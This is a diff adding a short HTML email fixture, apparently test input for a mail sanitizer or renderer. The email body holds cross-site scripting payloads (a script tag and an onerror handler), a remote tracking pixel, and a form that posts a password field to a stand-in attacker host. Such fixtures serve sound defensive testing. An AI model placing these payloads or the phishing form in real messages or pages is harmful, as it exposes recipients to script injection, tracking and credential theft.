@@ -1,0 +1,9 @@
+From: News <news@example.com>
+To: dan@example.com
+Subject: Offer
+Date: Sun, 22 Nov 2026 10:00:00 +0000
+Message-ID: <html@example.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><script>alert(1)</script><img src="x" onerror="alert(2)"><img src="https://tracker.example/p.gif"><form action="https://evil.example/"><input name="pw"></form><p>Hello</p></body></html>
